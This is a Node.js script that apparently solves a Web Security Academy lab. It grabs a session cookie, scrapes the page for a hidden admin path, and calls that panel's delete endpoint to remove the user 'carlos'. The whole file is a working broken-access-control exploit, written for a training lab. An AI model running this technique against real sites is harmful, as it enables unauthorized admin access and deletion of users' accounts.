function deleteUser(url, adminUrl, cookies) {
    const response = fetch(`${url}${adminUrl}/delete?username=carlos`, {
        method: 'GET',
        headers: {
            'Cookie': `session=${cookies}`,
        }
    })
    .then((response) => console.log(response.status))
    .catch((error) => console.log(error));

    return response;
}

function adminPageSearch(url, sessionCookie){
    const response = fetch(url, {
        method: 'GET',
        headers: {
            'Cookie': `session=${sessionCookie}`,
        }
    })
    .then((response) => response.text())
    .then((data) => data.match(/\/admin-[\w-]*/g)[0])

    return response;
}

function generateCookie(url) {
    const response = fetch(url, {
        method: 'GET',
    })
    .then((response) => {
        return response.headers.get('set-cookie').split(';')[0].split('=')[1];
    });
    
    return response;

}

// generateCookie('https://0ace008f04b4997581149ebe00af00d8.web-security-academy.net/')

async function main(){
    const arg = process.argv.slice(2);

    if(arg.length < 1){
        console.log("Usage: node app.js <url>");
        process.exit(1);
    }

    const url = arg[0];
    const sessionCookie = await generateCookie(url);
    console.log(sessionCookie);

    const adminPageLink = await adminPageSearch(url, sessionCookie);
    console.log(adminPageLink);
    const deletionResult = await deleteUser(url, adminPageLink, sessionCookie);
    console.log(deletionResult);

}

main();